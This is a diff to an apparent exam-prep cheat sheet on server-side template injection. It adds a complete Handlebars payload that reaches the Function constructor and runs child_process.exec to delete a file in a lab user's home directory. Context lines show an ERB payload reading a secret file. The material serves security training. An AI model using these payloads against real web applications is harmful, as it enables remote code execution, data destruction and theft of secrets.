@@ -127,6 +127,38 @@ $str.valueOf($chr.toChars($out.read()))
 <%= `cat /home/carlos/secret` %>
 ```
 
+---
+
+### Handlebars (Node.js)
+**RCE (Delete File):**
+```handlebars
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+**How it works:**
+- Exploits Handlebars helper functions
+- Accesses `Function.constructor`
+- Executes arbitrary Node.js code
+- Uses `child_process.exec()` for RCE
+
 ## 🎓 Exam Tips
 
 1. **Test template expressions first** - `{{7*7}}`, `${7*7}`, etc.
